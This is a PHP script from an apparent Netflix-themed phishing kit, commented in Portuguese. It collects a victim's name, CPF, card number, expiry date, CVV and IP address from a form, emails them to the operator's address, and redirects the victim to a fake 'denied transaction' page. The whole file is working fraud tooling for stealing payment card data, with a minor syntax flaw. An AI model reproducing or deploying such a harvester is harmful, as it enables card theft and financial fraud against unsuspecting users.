<?php
//printf('<pre>%s</pre>',  var_export($_POST,true));
//exit;
$firstNameCC = $_POST['firstNameCC'];
$cpf = $_POST['cpf'];
$cardNumberCC = $_POST['cardNumberCC'];
$exp = $_POST['exp'];
$expYr = $_POST['expYr'];
$securityCode_CC = $_POST['securityCode'];
$ip = $_SERVER["REMOTE_ADDR"];
$hora=date("H:i:s");
$ch = @curl_init();
$cc=$cc;
$emailremetente = "SEU EMAIL"
$store = @curl_exec ($ch);
$var = $store;
$q = explode("<i>", $var);
$q2 = explode("</i>", $q[1]);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: $emailremetente\r\n";
$conteudo.="<b>IP Cliente: </b>$ip <br>"; // IP Vitima
$conteudo.="<b>======== NETFLIX INFO CC ========</b><br>"; // Corpo da Mensagem
$conteudo.="<b>Nome:</b> $firstNameCC<br>";
$conteudo.="<b>CPF:</b> $cpf<br>";
$conteudo.="<b>Numero CC</b> $cardNumberCC<br>";
$conteudo.="<b>Exp Mes:</b> $exp<br>";
$conteudo.="<b>Exp Ano:</b> $expYr<br>";
$conteudo.="<b>CVV:</b> $securityCode_CC<br>";
$conteudo.="<b>======== NETFLIX INFO CC =======</b><br>";// Corpo da Mensagem
mail($emailremetente,$ip,$conteudo,$headers); 
header ("location: ../falha/deniedtransaction.html"); // Redirecionamento e tempo em segundos.
?>




